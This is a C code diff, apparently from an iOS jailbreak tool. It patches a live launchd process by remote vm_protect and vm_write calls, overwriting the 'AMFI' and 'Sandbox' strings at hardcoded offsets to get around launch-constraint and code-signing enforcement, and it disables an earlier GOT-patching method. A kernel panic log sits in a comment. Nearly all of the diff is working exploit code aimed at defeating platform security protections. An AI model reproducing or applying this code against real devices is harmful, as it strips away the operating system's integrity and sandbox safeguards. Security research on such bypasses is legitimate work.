@@ -294,6 +294,16 @@ vm_offset_t findSbinLaunchdOff(void) {
         
         printf("Successfully overwrote launchd executable path string to %s\n", newPath);
 
+
+// Bypass panic by launch constraints
+/*
+    "panicString" : "panic(cpu 0 caller 0xfffffff0143bbf98): unexpected SIGKILL of launchd (CS_KILLED) with reason 
+    -- namespace 3 code 0x4 description Launch Constraint Violation, error info: c[5]p[1]m[1]e[0], (Constraint not matched) launch type 0, 
+    failure proc [vc: 4]: \/private\/preboot\/121F3E86149F8454EF446D420C7189A8968F14B26A79D959ECF01CD248BEC9895804698A25D95CA947847730F8BFDC9F\/launchd\nDebugger message: panic ...
+*/
+
+// *** Method 1: Patch `mov x0, #0, ret` address to _posix_spawnattr_setmacpolicyinfo_np_ptr@got ***
+#if 0
         // 1. Find  _posix_spawnattr_setmacpolicyinfo_np_ptr symbol ptr address(which is in __auth_got segment) that will be overwritten.
         // Sorry, but it's hardcoded symbolptr address at that moment. because I'm lazy.
 
@@ -369,6 +379,54 @@ vm_offset_t findSbinLaunchdOff(void) {
         }
 
         // 7. Userspace reboot? (Beforehand put fastpathsigned launchd to path - /var/.launchd )
+#endif
+
+// *** Method 2: Patch `AMFI`, `Sandbox` string that being used as _amfi_launch_constraint_set_spawnattr's arguments ***
+#if 1
+        // Patch string `AMFI`
+        vm_offset_t amfi_str_off = 0x6744c;
+
+        printf("reprotecting 0x%lx\n", launchd_base + amfi_str_off);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, launchd_base + amfi_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_protect failed\n");
+            return;
+        }
+        
+        const char *newStr = "AAAA\x00";
+        RemoteWriteString(map, newStr);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_write failed\n");
+            return;
+        }
+        RemoteTaskHexDump(launchd_base + amfi_str_off, 0x100, launchd_task, (uint64_t)map);
+
+        // Patch string `Sandbox`
+        vm_offset_t sandbox_str_off = 0x5B918;
+
+        printf("reprotecting 0x%lx\n", launchd_base + sandbox_str_off);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, launchd_base + sandbox_str_off, 0x20, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_protect failed\n");
+            return;
+        }
+        
+        const char *newStr2 = "BBBBBBB\x00";
+        RemoteWriteString(map, newStr2);
+        RemoteChangeLR(0xFFFFFF00); // fix autibsp
+        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + sandbox_str_off, map, 8);
+        if (kr != KERN_SUCCESS) {
+            printf("vm_write failed\n");
+            return;
+        }
+        RemoteTaskHexDump(launchd_base + sandbox_str_off, 0x100, launchd_task, (uint64_t)map);
+
+#endif
+
 
         RemoteArbCall(exit, 0);
         
